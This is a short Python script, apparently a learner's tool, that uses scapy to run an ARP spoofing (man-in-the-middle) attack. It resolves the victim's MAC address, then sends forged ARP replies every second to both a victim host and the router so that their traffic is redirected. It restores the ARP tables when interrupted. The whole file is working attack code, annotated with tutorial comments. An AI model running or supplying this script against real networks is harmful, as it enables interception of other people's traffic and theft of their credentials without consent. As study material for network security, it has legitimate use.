#!usr/bin/env python

import scapy.all as scapy                            #to capture and examine packet level data.
import time                                          #used to manipulate with time, E.g, Delay.
import sys                                           #used to allow system level commands.

def scan(ip) :                                       #used to get the targetip's mac address.
    arp_request = scapy.ARP(pdst=ip)                 #crafting an arp packet.
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #crafting broadcast packet to the router.
    arp_request_broadcast = broadcast / arp_request     #appending broadcast packet and arp packet.
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]    #transmitting the packet using srp function. and storing the output in answered variable.
    return answered[0][1].hwsrc                      #returning the mac address part of the list element

def spoof(targetip, spoofip ):
    dst_mac=scan(targetip)                                                   #to get the mac address of the target ip.
    packet = scapy.ARP(op=2,psrc=spoofip,pdst=targetip,hwdst=dst_mac)        #creating an arp response(op=2)
    scapy.send(packet,verbose= False)                                        #send is used to send the arp response. for request we use srp(send.srp)
                                                                             #To neglect verbose output

def respoof(targetip, spoofip ):                                             #to change it to the default arp table by specifing the hwsrc.
    dst_mac=scan(targetip)
    packet = scapy.ARP(op=2,psrc=spoofip,pdst=targetip,hwdst=dst_mac,hwsrc="18:f1:45:26:47:31")
    scapy.send(packet,verbose= False)



try:
    packetsent = 0
    while True:                                         #to constantly send the packets untill ctrl+c. with sleep time of 1sec betwween each response packet.
                                                        #or else the mac address will get reset while the target sends a request.
        spoof("192.168.1.101","192.168.1.1")            #"targetip" "spoofip" (To machine)
        spoof("192.168.1.1","192.168.1.101")            #"targetip" "spoofip"   (To router)
        packetsent=packetsent + 2
        print("\r[+]packets sent:"+ str(packetsent)), #adding "," to stop going to the next line. \r will over write on the previous output.
        sys.stdout.flush()                            #asking system to print immediately without storing the buffer and printing afrer the termination.
        time.sleep(1)
except KeyboardInterrupt:
    respoof("192.168.1.101","192.168.1.1")              #"targerip", "spoofip"   #back to default arp table
    respoof("192.168.1.1","192.168.1.101")              #"targerip", "spoofip"
    print("[+] Detected ctrl + C aborting...changing to default")
